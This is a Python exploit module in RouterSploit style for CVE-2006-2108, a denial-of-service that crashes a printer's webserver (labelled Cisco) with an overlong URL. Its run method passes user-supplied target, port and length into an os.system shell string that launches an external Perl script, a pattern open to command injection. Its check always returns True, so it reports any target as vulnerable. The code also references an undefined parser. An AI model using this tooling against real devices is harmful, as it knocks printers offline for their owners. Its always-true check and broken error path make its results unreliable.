



import sys,os

from routersploit.core.exploit import *

from routersploit.core.http.http_client import HTTPClient

from ctypes import *



class Exploit(HTTPClient):



    __info__ = {

        "name": "CVE-2006-2108",

        "description": "the printer runs a webserver to provide various printing tasks from "
                       "java enabled browsers. Input is being filtered for bad characters. "
                       "However it is vulnerable to a long url request. This will either reboot or crash the device."
                       "On crash, the 'system' led on the printer changes from green to orange. No further printing is done"
                       "until somebody resets the printer by flipping the powerswitch. ",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "",

        ),

        "devices": (

            "Cisco, CVE-2006-2108"
        ),
    }


    target = OptIP("", "dest_addr IPv4 or IPv6 address")
    port = OptPort("", "The printer port")
    length = OptString("","request length ")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {} {}'.format('CVE-2006-2108.pl',self.target,self.port,self.length)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            parser.print_help(sys.stderr)

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
